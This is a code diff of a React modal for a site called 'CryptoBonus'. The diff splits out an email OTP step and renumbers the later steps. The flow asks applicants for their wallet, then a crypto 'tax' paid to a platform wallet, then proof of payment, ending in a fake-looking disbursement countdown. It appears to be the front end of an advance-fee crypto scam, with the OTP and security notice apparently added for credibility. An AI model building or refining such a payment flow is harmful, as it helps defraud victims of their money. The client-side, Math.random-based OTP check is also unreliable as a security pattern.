@@ -46,23 +46,22 @@ const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 const isValidEmail = (value: string) => EMAIL_REGEX.test(value.trim());
 
 const WALLET_REGEX: Record<string, RegExp> = {
-  BTC:  /^(1|3)[a-zA-Z0-9]{24,33}$|^bc1[a-zA-Z0-9]{6,87}$/,
-  ETH:  /^0x[a-fA-F0-9]{40}$/,
-  BNB:  /^bnb1[a-z0-9]{38}$/,
+  BTC: /^(1|3)[a-zA-Z0-9]{24,33}$|^bc1[a-zA-Z0-9]{6,87}$/,
+  ETH: /^0x[a-fA-F0-9]{40}$/,
+  BNB: /^bnb1[a-z0-9]{38}$/,
   USDT: /^0x[a-fA-F0-9]{40}$/,
-  SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
-  XRP:  /^r[a-zA-Z0-9]{24,33}$/,
+  SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
+  XRP: /^r[a-zA-Z0-9]{24,33}$/,
 };
 
 const isValidWallet = (address: string, coin: string) =>
   WALLET_REGEX[coin]?.test(address.trim()) ?? false;
 
-/** Generate a random 6-digit numeric OTP */
 const generateOtp = () =>
   Math.floor(100000 + Math.random() * 900000).toString();
 
-/** Total disbursement countdown in seconds (60 min) */
 const COUNTDOWN_SECONDS = 60 * 60;
+const TOTAL_STEPS = 5;
 
 interface ApplicationModalProps {
   open: boolean;
@@ -84,15 +83,15 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   const [txHash, setTxHash] = useState("");
   const [copied, setCopied] = useState(false);
 
-  // ── OTP state ──
-  const [otp, setOtp] = useState(""); // the generated code
-  const [otpInput, setOtpInput] = useState(""); // what user types
+  // OTP state
+  const [otp, setOtp] = useState("");
+  const [otpInput, setOtpInput] = useState("");
   const [otpSending, setOtpSending] = useState(false);
   const [otpSent, setOtpSent] = useState(false);
   const otpTouched = otpInput.length > 0;
   const otpValid = otpInput === otp && otp !== "";
 
-  // ── Countdown state (Step 3) ──
+  // Countdown state
   const [secondsLeft, setSecondsLeft] = useState(COUNTDOWN_SECONDS);
   const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
@@ -112,18 +111,14 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     return taxUsd / coin.price;
   }, [taxUsd, coin?.price]);
 
-  // Derived validation
   const emailValid = isValidEmail(email);
   const showEmailError = emailTouched && !emailValid;
   const walletValid = isValidWallet(walletAddress, selectedCoin);
   const showWalletError = walletTouched && !walletValid;
 
   const canApply = fullName.trim() && emailValid && walletValid;
-  // "I've Paid" is gated on correct OTP
-  const canProceedToPay = otpValid;
   const canSubmitProof = txHash.trim() || proofFile;
 
-  // ── Start live countdown when entering Step 3 ──
   const startCountdown = useCallback(() => {
     setSecondsLeft(COUNTDOWN_SECONDS);
     if (countdownRef.current) clearInterval(countdownRef.current);
@@ -138,7 +133,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     }, 1000);
   }, []);
 
-  // Cleanup on unmount
   useEffect(() => {
     return () => {
       if (countdownRef.current) clearInterval(countdownRef.current);
@@ -151,7 +145,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     return `${m}:${s}`;
   };
 
-  // ── Send OTP via EmailJS then advance to Step 1 ──
   const handleApply = async () => {
     setEmailTouched(true);
     setWalletTouched(true);
@@ -166,7 +159,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     try {
       await emailjs.send(
         "service_tgxebrt",
-        "template_y4pyzoz", // reuse existing template — pass code via a field
+        "template_y4pyzoz",
         {
           to_email: email,
           user_name: fullName,
@@ -210,7 +203,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
       .catch(console.error);
 
     startCountdown();
-    setStep(3);
+    setStep(4);
   };
 
   const handleClose = () => {
@@ -235,21 +228,26 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     }, 300);
   };
 
+  const stepTitles: Record<number, string> = {
+    0: "Apply for Bonus",
+    1: "Verify Your Email",
+    2: "Your Bonus Allocation",
+    3: "Upload Proof of Payment",
+    4: "Application Submitted",
+  };
+
   return (
     <Dialog open={open} onOpenChange={handleClose}>
       <DialogContent className="sm:max-w-lg bg-card border-border overflow-hidden max-h-[90vh] overflow-y-auto">
         <DialogHeader>
           <DialogTitle className="font-display text-foreground">
-            {step === 0 && "Apply for Bonus"}
-            {step === 1 && "Your Bonus Allocation"}
-            {step === 2 && "Upload Proof of Payment"}
-            {step === 3 && "Application Submitted"}
+            {stepTitles[step]}
           </DialogTitle>
         </DialogHeader>
 
         {/* Step indicators */}
         <div className="flex items-center gap-2 mb-4">
-          {[0, 1, 2, 3].map((s) => (
+          {Array.from({ length: TOTAL_STEPS }, (_, s) => (
             <div
               key={s}
               className={`h-1 flex-1 rounded-full transition-colors ${
@@ -260,7 +258,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
         </div>
 
         <AnimatePresence mode="wait">
-
           {/* ── Step 0: Application form ── */}
           {step === 0 && (
             <motion.div
@@ -313,13 +310,12 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                     placeholder="john@example.com"
                     className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
                   />
-                  {emailTouched && (
-                    emailValid ? (
+                  {emailTouched &&
+                    (emailValid ? (
                       <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
                     ) : (
                       <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
-                    )
-                  )}
+                    ))}
                 </div>
                 {showEmailError && (
                   <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
@@ -385,13 +381,12 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                     placeholder="Enter your wallet address"
                     className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
                   />
-                  {walletTouched && (
-                    walletValid ? (
+                  {walletTouched &&
+                    (walletValid ? (
                       <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
                     ) : (
                       <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
-                    )
-                  )}
+                    ))}
                 </div>
                 {showWalletError && (
                   <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
@@ -445,10 +440,102 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* ── Step 1: Bonus allocation + OTP + tax fee ── */}
+          {/* ── Step 1: OTP Verification (standalone) ── */}
           {step === 1 && (
             <motion.div
               key="step1"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              className="space-y-5"
+            >
+              <div className="text-center py-4">
+                <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
+                  <KeyRound className="h-7 w-7 text-primary" />
+                </div>
+                <p className="text-muted-foreground text-sm">
+                  We sent a 6-digit verification code to
+                </p>
+                <p className="text-foreground font-medium text-sm mt-1">{email}</p>
+              </div>
+
+              {/* OTP input */}
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Verification Code
+                </label>
+                <div
+                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-3 transition-colors ${
+                    otpTouched && !otpValid
+                      ? "border-destructive ring-1 ring-destructive/50"
+                      : otpValid
+                      ? "border-success ring-1 ring-success/50"
+                      : ""
+                  }`}
+                >
+                  <KeyRound
+                    className={`h-4 w-4 shrink-0 transition-colors ${
+                      otpTouched && !otpValid
+                        ? "text-destructive"
+                        : otpValid
+                        ? "text-success"
+                        : "text-muted-foreground"
+                    }`}
+                  />
+                  <input
+                    value={otpInput}
+                    onChange={(e) =>
+                      setOtpInput(e.target.value.replace(/\D/g, "").slice(0, 6))
+                    }
+                    placeholder="Enter 6-digit code"
+                    maxLength={6}
+                    autoFocus
+                    className="bg-transparent text-foreground text-lg outline-none flex-1 placeholder:text-muted-foreground/50 font-mono tracking-[0.3em] text-center"
+                  />
+                  {otpTouched &&
+                    (otpValid ? (
+                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
+                    ) : (
+                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
+                    ))}
+                </div>
+                {otpTouched && !otpValid && (
+                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
+                    <AlertCircle className="h-3 w-3" />
+                    Incorrect code. Check your email and try again.
+                  </p>
+                )}
+              </div>
+
+              {/* Security note */}
+              <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
+                <p className="text-xs text-muted-foreground">
+                  <span className="text-primary font-medium">Don't share this code.</span>{" "}
+                  CryptoBonus will never ask you for this code. If you didn't request this,
+                  ignore it.
+                </p>
+              </div>
+
+              <div className="flex gap-3">
+                <Button variant="outline" className="flex-1" onClick={() => setStep(0)}>
+                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
+                </Button>
+                <Button
+                  variant="hero"
+                  className="flex-1"
+                  disabled={!otpValid}
+                  onClick={() => setStep(2)}
+                >
+                  Verify <ArrowRight className="ml-2 h-4 w-4" />
+                </Button>
+              </div>
+            </motion.div>
+          )}
+
+          {/* ── Step 2: Bonus allocation + tax + wallet ── */}
+          {step === 2 && (
+            <motion.div
+              key="step2"
               initial={{ opacity: 0, x: 20 }}
               animate={{ opacity: 1, x: 0 }}
               exit={{ opacity: 0, x: -20 }}
@@ -511,60 +598,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </p>
               </div>
 
-              {/* ── Verification code input ── */}
-              <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block flex items-center gap-1.5">
-                  <KeyRound className="h-3.5 w-3.5" />
-                  Verification Code
-                  {otpSent && (
-                    <span className="text-xs text-success ml-1">
-                      (sent to {email})
-                    </span>
-                  )}
-                </label>
-                <div
-                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
-                    otpTouched && !otpValid
-                      ? "border-destructive ring-1 ring-destructive/50"
-                      : otpValid
-                      ? "border-success/50"
-                      : ""
-                  }`}
-                >
-                  <KeyRound
-                    className={`h-4 w-4 shrink-0 transition-colors ${
-                      otpTouched && !otpValid
-                        ? "text-destructive"
-                        : otpValid
-                        ? "text-success"
-                        : "text-muted-foreground"
-                    }`}
-                  />
-                  <input
-                    value={otpInput}
-                    onChange={(e) =>
-                      setOtpInput(e.target.value.replace(/\D/g, "").slice(0, 6))
-                    }
-                    placeholder="Enter 6-digit code"
-                    maxLength={6}
-                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono tracking-widest"
-                  />
-                  {otpTouched && (
-                    otpValid ? (
-                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
-                    ) : (
-                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
-                    )
-                  )}
-                </div>
-                {otpTouched && !otpValid && (
-                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
-                    <AlertCircle className="h-3 w-3" />
-                    Incorrect code. Check your email and try again.
-                  </p>
-                )}
-              </div>
-
               {/* Platform wallet */}
               <div>
                 <p className="text-muted-foreground text-xs mb-2">
@@ -588,14 +621,13 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               </div>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1" onClick={() => setStep(0)}>
+                <Button variant="outline" className="flex-1" onClick={() => setStep(1)}>
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
                 <Button
                   variant="hero"
                   className="flex-1"
-                  disabled={!canProceedToPay}
-                  onClick={() => setStep(2)}
+                  onClick={() => setStep(3)}
                 >
                   I've Paid <ArrowRight className="ml-2 h-4 w-4" />
                 </Button>
@@ -603,10 +635,10 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* ── Step 2: Upload proof ── */}
-          {step === 2 && (
+          {/* ── Step 3: Upload proof ── */}
+          {step === 3 && (
             <motion.div
-              key="step2"
+              key="step3"
               initial={{ opacity: 0, x: 20 }}
               animate={{ opacity: 1, x: 0 }}
               exit={{ opacity: 0, x: -20 }}
@@ -661,7 +693,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               </div>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1" onClick={() => setStep(1)}>
+                <Button variant="outline" className="flex-1" onClick={() => setStep(2)}>
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
                 <Button
@@ -676,10 +708,10 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* ── Step 3: Confirmation + live countdown ── */}
-          {step === 3 && (
+          {/* ── Step 4: Confirmation + live countdown ── */}
+          {step === 4 && (
             <motion.div
-              key="step3"
+              key="step4"
               initial={{ opacity: 0, scale: 0.95 }}
               animate={{ opacity: 1, scale: 1 }}
               className="text-center py-6 space-y-4"
@@ -699,7 +731,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 verification.
               </p>
 
-              {/* Live countdown */}
               <div className="glass-card rounded-xl p-4 inline-flex flex-col items-center gap-1">
                 <div className="flex items-center gap-2 text-sm text-muted-foreground mb-1">
                   <Clock className="h-4 w-4 text-primary animate-pulse" />
@@ -726,7 +757,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               </div>
             </motion.div>
           )}
-
         </AnimatePresence>
       </DialogContent>
     </Dialog>
